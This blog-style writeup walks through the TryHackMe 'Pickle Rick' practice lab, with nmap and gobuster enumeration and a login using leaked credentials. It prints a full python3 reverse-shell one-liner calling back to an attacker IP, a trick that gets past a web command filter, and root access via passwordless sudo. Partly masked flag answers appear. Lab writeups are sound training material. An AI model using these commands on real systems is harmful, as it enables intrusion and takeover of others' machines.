---
title:  "Pickle Rick Writeup - TryHackMe"
date:   2021-04-04 04:00:00 -0400
categories: [THM]
toc: true
comments: false
tags: [privesc]
---

This time i'll be working with the room [Pickle Rick](https://www.tryhackme.com/room/picklerick) from **TryHackMe**. This is a free lab with an easy difficulty.

## Lab info

![Lab Info](/images/THM/PickleRick/00-room-info.png)

## Enumeration

All ports nmap scan: ```nmap -p- -sS --min-rate 5000 -n -v 10.10.123.34 -oG allPorts.gnmap```

```plaintext
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
```

Basic enumeration scripts for ports 22,80: ```nmap -sC -sV -p22,80 10.10.123.34 -oN ports.nmap```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:30 -04
Nmap scan report for 10.10.123.34
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:c4:23:86:8e:70:33:66:18:f0:84:e8:6b:93:eb:bc (RSA)
|   256 a9:25:85:0b:08:8f:30:36:36:9a:b2:3b:d6:bf:d1:07 (ECDSA)
|_  256 38:d9:59:3b:50:cd:b6:de:8d:60:06:bf:46:1e:d5:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Finally, let's run an http-enum script on port 80: ```nmap --script http-enum -p80 10.10.123.34 -oN webscan.nmap```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-04 13:31 -04
Nmap scan report for 10.10.123.34
Host is up (0.34s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
```

So, after all those scans we get:

* Webpage: http://10.10.123.34

![Web Page](/images/THM/PickleRick/15-web-page.png)

As a good habit, you may want to check the source code of the webpages.

![Web Page Source Code](/images/THM/PickleRick/21-username.png)

And just like that we get the username ```R1******```

---

* Login: http://10.10.123.34/login.php

![Login Page](/images/THM/PickleRick/20-login-page.png)

---

* Robots file: http://10.10.123.34/robots.txt

![robots](/images/THM/PickleRick/24-robots-web.png)

In robots.txt we see ```Wub********```, let's save it in case it's useful later. 

Just to be sure, now we will launch a gobuster directory scan in case nmap missed something. 

Gobuster scan: ```gobuster dir -u http://10.10.123.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 --no-error```

```plaintext
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.34
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/04 13:55:58 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.123.34/assets/]
/server-status        (Status: 403) [Size: 300]

===============================================================
2021/04/04 14:04:25 Finished
===============================================================
```

Gobuster will find that the ```/assets``` directory contain nothing interesting.


## Gaining access

Moving on to the login page, using the info gathered before, we could try to use ```R1*****``` as username and ```Wub********``` as password... and it actually works.

The next we will see is a Command Panel and an input to run commands.

![Command Panel](/images/THM/PickleRick/26-command-panel.png){: .align-center}

If we try to navigate to another tab, we get the message: *Only the **REAL** rick can view this page...*

![Denied](/images/THM/PickleRick/33-denied.png){: .align-center}

Back at the Command Panel, let's assume we can run system commands and try a few.

![whoami](/images/THM/PickleRick/27-command-whoami.png){: .align-center}

![ls](/images/THM/PickleRick/30-command-panel-ls.png){: .align-center}

Running ```cat Sup3rS3cretPickl3Ingred.txt``` the following message will show up. 

![cat](/images/THM/PickleRick/28-command-cat.png){: .align-center}

Now we know some commands are being blocked, but ```less``` is not one of them. 

![First Flag](/images/THM/PickleRick/29-first-ing.png){: .align-center}

**First Ingredient:** ```mr. m*******```

## Getting a shell

For the reverse shell, first we want to make sure the command we are going to use exist in the system and is allowed. Trying python gets no results but python3 will do the trick. 

Using this [Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) as a reference, we craft the following command:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.103",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now, we open a listener on port 443 with netcat and run our command to get the shell.

![Shell](/images/THM/PickleRick/34-first-shell.png){: .align-center}

## Privilege Escalation

This is the easiest part, the first thing we could do is check the ```www-data``` user privileges with ```sudo -l```. We will find out that we can execute commands as root without providing password.

Running ```sudo su``` will make us root user.

![Privesc](/images/THM/PickleRick/37-privesc.png){: .align-center}

The last thing would be locating the other two ingredients. If we check the  ```/home``` path we will see rick directory inside along with the second ingredient.

![Second Flag](/images/THM/PickleRick/35-second-ing.png){: .align-center}

**Second Ingredient:** ```1 je*******```

And the last ingredient could be found in the home directory for root or using ```find```.

```bash
find / -type f -name "*.txt" | grep -v "usr"
```
![Third Flag](/images/THM/PickleRick/40-third-ing.png){: .align-center}

**Third Ingredient:** ```fle*******```

And that's all for this lab.